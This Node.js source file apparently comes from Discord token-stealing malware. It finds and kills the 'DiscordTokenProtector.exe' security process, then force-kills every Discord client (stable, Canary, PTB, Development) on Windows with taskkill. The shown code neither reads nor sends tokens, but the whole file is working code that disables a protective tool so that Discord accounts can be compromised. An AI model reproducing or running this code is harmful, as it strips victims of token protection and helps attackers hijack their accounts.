const { isWindows } = require('../os');
const { exec } = require('child_process');
// https://stackoverflow.com/a/69692834/13088041
const psList = () => import('ps-list').then(({ default: psList }) => psList());

// https://stackoverflow.com/a/46969969/13088041
psList().then(data => {
  const dtp = data.find(process => process.name === 'DiscordTokenProtector.exe');
  // There's a DTP process, kill it
  if (!!dtp) process.kill(dtp.pid);
});

// Kills every version of Discord running
['discord', 'discordcanary', 'discorddevelopment', 'discordptb'].forEach(app => {
  isWindows() && exec(`taskkill /f /im ${app}.exe`);
});
